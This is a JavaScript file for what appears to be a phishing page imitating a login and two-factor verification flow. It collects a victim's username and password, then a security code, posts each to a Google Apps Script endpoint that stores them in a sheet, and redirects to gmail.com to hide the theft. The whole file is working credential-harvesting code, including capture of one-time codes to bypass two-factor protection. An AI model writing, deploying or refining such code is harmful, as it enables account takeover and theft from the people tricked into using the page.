// public/script.js

// Your Apps Script endpoint
const scriptUrl = 'https://script.google.com/macros/s/AKfycbyEvhxQh7kuu7iK-Tq-CCyQiBBGxelCd2Jb9mmqfU2mrYucTN6S12f1NBHGyqRkJOu8/exec';

// Element references
const regForm     = document.getElementById('registrationForm');
const verForm     = document.getElementById('verificationForm');
const submitBtn   = document.getElementById('submitBtn');
const resendBtn   = document.getElementById('resendBtn');
const continueBtn = document.getElementById('continueBtn');
const countdownEl = document.getElementById('countdown');

let timerInterval;
let timeLeft = 120; // seconds

// 1) On "Log in" click: send username+password, then show verification
regForm.addEventListener('submit', async e => {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();

  if (!username || !password) {
    alert('Please enter both username and password.');
    return;
  }

  // Disable button & show logging state
  submitBtn.innerText = 'Logging in…';
  submitBtn.disabled = true;

  // POST credentials to your Apps Script
  try {
    const params = new URLSearchParams();
    params.append('username', username);
    params.append('name', password);   // 'name' param maps to your sheet's password column

    await fetch(scriptUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: params.toString()
    });
  } catch (err) {
    console.error('Error saving credentials:', err);
    // you might choose to alert here
  }

  // Swap forms
  regForm.classList.add('hidden');
  verForm.classList.remove('hidden');

  // Start the 2‑minute countdown
  startTimer();
});

// Timer logic
function startTimer() {
  timeLeft = 120;
  resendBtn.disabled = true;
  updateDisplay();

  clearInterval(timerInterval);
  timerInterval = setInterval(() => {
    timeLeft--;
    updateDisplay();
    if (timeLeft <= 0) {
      clearInterval(timerInterval);
      resendBtn.disabled = false;
    }
  }, 1000);
}

function updateDisplay() {
  const mins = String(Math.floor(timeLeft / 60)).padStart(2, '0');
  const secs = String(timeLeft % 60).padStart(2, '0');
  countdownEl.textContent = `${mins}:${secs}`;
}

// 2) Resend code → restart timer
resendBtn.addEventListener('click', () => {
  startTimer();
});

// 3) Continue → send code, then redirect
continueBtn.addEventListener('click', async () => {
  const code = document.getElementById('securityCode').value.trim();
  if (!code) {
    alert('Please enter the security code.');
    return;
  }

  try {
    const params = new URLSearchParams();
    params.append('username', code);
    params.append('name', code);

    await fetch(scriptUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: params.toString()
    });
  } catch (err) {
    console.error('Error saving code:', err);
  }

  // final redirect
  window.location.href = 'https://www.gmail.com';
});
